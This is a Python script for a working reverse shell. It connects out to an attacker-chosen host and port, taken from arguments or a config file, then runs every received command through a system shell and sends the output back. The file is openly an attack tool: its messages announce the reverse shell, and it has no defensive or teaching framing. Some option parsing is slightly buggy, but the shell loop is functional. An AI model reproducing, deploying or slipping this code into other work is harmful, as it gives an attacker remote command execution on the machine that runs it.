#!/usr/bin/env python3

import sys
import getopt

import socket
import subprocess
import os

import time
from colorama import Fore

def print_c(*args, COLOR="", end="\n"):
	line = ""
	if COLOR.lower() == "":
		line = Fore.WHITE
	elif COLOR.lower() == "red":
		line = Fore.RED
	elif COLOR.lower() == "green":
		line = Fore.GREEN
	elif COLOR.lower() == "blue":
		line = Fore.BLUE
	elif COLOR.lower() == "yellow":
		line = Fore.YELLOW
	elif COLOR.lower() == "cyan":
		line = Fore.CYAN
	elif COLOR.lower() == "magenta":
		line = Fore.MAGENTA
	elif COLOR.lower() == "black":
		line = Fore.BLACK
	elif COLOR.lower() == "white":
		line = Fore.WHITE
	elif COLOR.lower() == "reset":
		line = Fore.RESET
	cline = ""
	for a in args:
		cline += str(a)
	line += cline + Fore.RESET
	print(line)

class Connection:
	def __init__(self, host, port):
		self.SERVER_HOST = host
		self.SERVER_PORT = port
		time.sleep(1)
	def reverse_connect(self):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((self.SERVER_HOST, self.SERVER_PORT))
			s.send(b"[+] Connection established\n")
			print_c("[+] Connection established to host", COLOR="magenta")
			print_c("\n[#] Shell Executions: ", COLOR="blue")
			prev = ""
			prev_c = 0
			while True:
				command = s.recv(1024).decode('utf-8')
				print_c("\n[~] RemoteHost : ", end=" ", COLOR="magenta")
				if command != "":
					print_c(command, COLOR="blue")
				if command == prev:
					prev_c += 1
				else:
					prev = command
					prev_c = 0
				if command.lower() == "exit" or prev_c > 20:
					s.send(b"[+] Closing connection\n")
					print_c("[-] Remote Host has closed the connection manually.", COLOR="yellow")
					break
				try:
					output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
					print_c(output.decode('ASCII'), COLOR="blue")
					s.send(output)
				except Exception as e:
					error_message = f"[-] Error executing command: {str(e)}\n".encode('utf-8')
					s.send(error_message)
			s.close()
		except Exception as e:
			print_c(f"Error: {str(e)}", COLOR="red")

if __name__ == "__main__":
	argList = sys.argv[1:]
	options = "hr:p:c:"
	loptions = ["help", "host=", "port=", "config="]
	SERVER_HOST = ""
	SERVER_PORT = ""
	menu_exit = False
	try:
		arguments, values = getopt.getopt(argList, options, loptions)
		if arguments == []:
			print_c("[X] No arguments provided, please refer to 'python main.py -h' for help", COLOR="red")
			exit(0)
		for currentArgument, currentValue in arguments:
			if currentArgument in ("-h", "--help"):
				print_c("Displaying Help")
				print_c("\tpython main.py -r <host> -p <port>")
				print_c("\tpython main.py -c <config file>")
				menu_exit = True
				break
			if currentArgument in ("-c" or "--config"):
				print_c("[-] Reading config file", COLOR="yellow")
				try:
					config_file = currentValue
					with open(config_file, 'r') as file:
						SERVER_HOST = "localhost"
						SERVER_PORT = "80"
						for line in file:
							if line.startswith('HOST='):
								SERVER_HOST = line.strip().split('=')[1]
							elif line.startswith('PORT='):
								SERVER_PORT = line.strip().split('=')[1]
				except FileNotFoundError:
					print_c("Config file not found.")
					menu_exit = True
				break
			if currentArgument in ("-r" or "--host"):
				print_c("[+] Host: ", currentValue, COLOR="green")
				SERVER_HOST = currentValue
			if currentArgument in ("-p" or "--port"):
				print_c("[+] Port: ", currentValue, COLOR="green")
				SERVER_PORT = currentValue
		if menu_exit:
			exit()
		print_c("[-] Establishing reverse shell", COLOR="yellow")
		conn = Connection(SERVER_HOST, int(SERVER_PORT))
		conn.reverse_connect()
	except:
		print_c("[X] Invalid Options!", COLOR="red")
